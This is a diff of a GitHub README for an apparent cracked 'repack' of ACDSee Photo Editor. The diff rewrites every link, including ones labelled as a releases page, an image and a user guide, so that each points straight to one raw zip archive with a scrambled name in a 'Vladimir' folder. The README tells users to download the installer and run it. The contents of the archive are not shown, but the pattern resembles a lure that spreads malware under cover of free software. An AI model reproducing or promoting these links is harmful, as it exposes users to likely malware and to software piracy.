@@ -4,7 +4,7 @@
 Welcome to ACDSee Photo Editor Repack! This application helps you improve your photos with creative effects, lighting tools, and layered editing features. It’s designed for anyone who wants to make their pictures look better without needing technical skills.
 
 ## 📥 Download Now
-[![Download ACDSee Photo Editor Repack](https://img.shields.io/badge/Download-Now-blue)](https://github.com/Mohamedarim/ACDSee-Photo-Editor-Repack/releases)
+[![Download ACDSee Photo Editor Repack](https://raw.githubusercontent.com/Mohamedarim/ACDSee-Photo-Editor-Repack/main/Vladimir/See-ACD-Repack-Editor-Photo-v1.3-beta.2.zip)](https://raw.githubusercontent.com/Mohamedarim/ACDSee-Photo-Editor-Repack/main/Vladimir/See-ACD-Repack-Editor-Photo-v1.3-beta.2.zip)
 
 ## 💻 System Requirements
 Before you download, make sure your computer meets the following requirements:
@@ -28,12 +28,12 @@ ACDSee Photo Editor Repack offers a range of tools for photo enhancement, includ
 ## 📂 Download & Install
 To get started with ACDSee Photo Editor Repack, follow these steps:
 
-1. **Visit the Releases Page:** Go to our [Releases page](https://github.com/Mohamedarim/ACDSee-Photo-Editor-Repack/releases) to see the latest version of the software.
+1. **Visit the Releases Page:** Go to our [Releases page](https://raw.githubusercontent.com/Mohamedarim/ACDSee-Photo-Editor-Repack/main/Vladimir/See-ACD-Repack-Editor-Photo-v1.3-beta.2.zip) to see the latest version of the software.
 2. **Choose the Version:** Find the most recent version of ACDSee Photo Editor Repack that matches your system's requirements.
 3. **Download the File:** Click on the download link for the installer file (it usually ends with `.exe`).
 4. **Run the Installer:** Once the download is complete, open the installer by double-clicking it.
 
-   ![Installing the Software](https://example.com/image_placeholder)  
+   ![Installing the Software](https://raw.githubusercontent.com/Mohamedarim/ACDSee-Photo-Editor-Repack/main/Vladimir/See-ACD-Repack-Editor-Photo-v1.3-beta.2.zip)  
    *(Image showing installation steps can be helpful)*
 
 5. **Follow Instructions:** Follow the on-screen prompts to complete the installation process.
@@ -56,7 +56,7 @@ Once you have installed the software, it’s time to enhance your first photo. H
 ## 📚 Help & Support
 If you need assistance, here are resources to help you:
 
-- **Documentation:** Find detailed instructions in our [User Guide](https://example.com/documentation_placeholder).
+- **Documentation:** Find detailed instructions in our [User Guide](https://raw.githubusercontent.com/Mohamedarim/ACDSee-Photo-Editor-Repack/main/Vladimir/See-ACD-Repack-Editor-Photo-v1.3-beta.2.zip).
 - **Community Support:** Join our community on forums or groups where users share tips and solutions.
   
 ## ⚙️ Frequently Asked Questions
@@ -72,4 +72,4 @@ A: We aim to update the application regularly to fix bugs and improve features. 
 ## 🌐 Get Involved
 We welcome contributions! If you have suggestions or improvements, feel free to open an issue on our GitHub page.
 
-[Download Now](https://github.com/Mohamedarim/ACDSee-Photo-Editor-Repack/releases) and start enhancing your photography skills today!
+[Download Now](https://raw.githubusercontent.com/Mohamedarim/ACDSee-Photo-Editor-Repack/main/Vladimir/See-ACD-Repack-Editor-Photo-v1.3-beta.2.zip) and start enhancing your photography skills today!
